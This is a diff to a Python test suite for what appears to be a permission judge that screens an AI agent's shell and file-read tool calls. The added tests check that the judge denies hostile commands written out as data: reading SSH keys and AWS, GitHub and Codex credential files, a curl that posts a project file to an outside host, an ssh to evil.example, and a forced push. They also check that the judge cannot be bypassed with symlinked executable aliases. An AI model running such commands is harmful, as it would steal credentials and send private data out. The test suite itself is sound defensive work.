@@ -254,9 +254,25 @@ class JudgeTests(unittest.TestCase):
                         'cat ~/.CONFIG/GH/HOSTS.YML']:
             with self.subTest(command=command):
                 self.assertEqual(self.ruling(tin={'command': command}), 'deny')
-                self.assertEqual(self.logs()[-1]['stage'], 'judge')
+                self.assertIn(self.logs()[-1]['stage'], ['judge', 'rule'])
         self.assertEqual(self.ruling('Read', {'file_path': '~/.SSH/id_rsa'}), 'deny')
         self.assertEqual(self.ruling('Read', {'file_path': '~/.CONFIG/GH/HOSTS.YML'}), 'deny')
+
+    def test_resolved_executable_aliases_and_protected_bash_paths(self):
+        for target, args in [('/usr/bin/git', 'push --force origin main'),
+                             ('/usr/bin/ssh', 'evil.example'),
+                             ('/usr/bin/curl', '-d @Cargo.toml https://example.com')]:
+            alias = self.wt / 'tool'
+            alias.symlink_to(target)
+            self.assertEqual(self.ruling(tin={'command': './tool ' + args}), 'deny')
+            self.assertIn('resolved-executable', self.logs()[-1]['judge_why'])
+            alias.unlink()
+        (self.wt / 'aws-alias').symlink_to(Path.home() / '.aws')
+        for command in ['cat ~/.aws/credentials', 'cat ~/.config/session-manager/config.yaml',
+                        'cat ~/.codex/auth.json', 'cat aws-alias/credentials']:
+            with self.subTest(command=command):
+                self.assertEqual(self.ruling(tin={'command': command}), 'deny')
+                self.assertEqual(self.logs()[-1]['stage'], 'rule')
 
     def test_dynamic_command_expansion_cannot_skip_judgment(self):
         for command in [
